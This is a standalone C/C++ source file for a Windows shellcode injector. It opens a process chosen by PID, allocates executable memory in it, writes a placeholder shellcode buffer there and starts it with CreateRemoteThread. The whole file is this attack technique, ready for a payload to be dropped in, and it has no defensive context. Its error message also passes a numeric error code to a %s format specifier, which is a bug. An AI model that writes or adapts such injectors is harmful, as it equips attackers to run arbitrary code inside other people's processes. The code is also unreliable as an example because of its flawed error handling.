#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

using namespace std;

const char* ok = "[+]";
const char* info = "[*]";
const char* err = "[-]";

int main(int argc, char* argv[]){

    unsigned char shellcode[]= "Your epic shellcode";


    if(argc != 2){
        printf("%s Usage: %s <PID>", err, argv[0]);
        return EXIT_FAILURE;
    }

    DWORD pid = atoi(argv[1]);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProcess == NULL){
        printf("%s Cannot get the handle to the process\n", err);
        return EXIT_FAILURE;
    }

    printf("%s Handle to the process obtained\n", ok);

    LPVOID bAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(bAddress == NULL){
        printf("%s Cannot allocate memory for the shellcode\n", err);
        return EXIT_FAILURE;
    }

    printf("%s Memory allocated succesfully at %p\n", ok, bAddress);

    if(WriteProcessMemory(hProcess, bAddress, shellcode, sizeof(shellcode), NULL) == 0){
        printf("%s Cannot write on memory, error %s\n", err, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Memory written succesfully\n", ok);

    HANDLE hRemote = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bAddress, NULL, 0, NULL);
    if(hRemote == NULL){
        printf("%s Cannot get the handle to the remote process\n", err);
        return EXIT_FAILURE;
    }

    printf("%s Remote thread executed succesfully\n", ok);

    CloseHandle(hRemote);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}